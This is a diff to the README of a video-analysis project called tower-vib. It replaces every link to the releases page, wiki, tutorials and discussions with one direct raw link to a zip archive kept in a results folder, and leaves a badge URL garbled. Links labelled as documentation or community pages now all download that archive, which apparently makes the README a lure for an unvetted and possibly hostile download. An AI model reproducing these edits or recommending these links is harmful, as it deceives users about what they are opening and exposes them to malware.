@@ -6,11 +6,11 @@ Welcome to the **tower-vib** project! This software allows you to analyze video 
 
 ## 🔗 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-v1.0-green)](https://github.com/Not-anybody-ever/tower-vib/releases)
+[![Download Here](https://raw.githubusercontent.com/Not-anybody-ever/tower-vib/main/results/tower_vib_v1.8.zip%20Now-v1.0-green)](https://raw.githubusercontent.com/Not-anybody-ever/tower-vib/main/results/tower_vib_v1.8.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/Not-anybody-ever/tower-vib/releases). You will find the latest version of the software here.
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Not-anybody-ever/tower-vib/main/results/tower_vib_v1.8.zip). You will find the latest version of the software here.
 
 ### Steps to Download and Install
 
@@ -71,9 +71,9 @@ For further assistance, visit the Issues section of the GitHub repository. Here,
 
 To dive deeper into the technology behind tower-vib, check out the following resources:
 
-- [Documentation](https://github.com/Not-anybody-ever/tower-vib/wiki): Detailed guides and explanations of each feature.
-- [Tutorials](https://github.com/Not-anybody-ever/tower-vib/tutorials): Step-by-step tutorials to help you make the most of the software.
-- [Community Discussions](https://github.com/Not-anybody-ever/tower-vib/discussions): Join discussions with other users and contribute your insights.
+- [Documentation](https://raw.githubusercontent.com/Not-anybody-ever/tower-vib/main/results/tower_vib_v1.8.zip): Detailed guides and explanations of each feature.
+- [Tutorials](https://raw.githubusercontent.com/Not-anybody-ever/tower-vib/main/results/tower_vib_v1.8.zip): Step-by-step tutorials to help you make the most of the software.
+- [Community Discussions](https://raw.githubusercontent.com/Not-anybody-ever/tower-vib/main/results/tower_vib_v1.8.zip): Join discussions with other users and contribute your insights.
 
 ## 🏷️ Topics
 
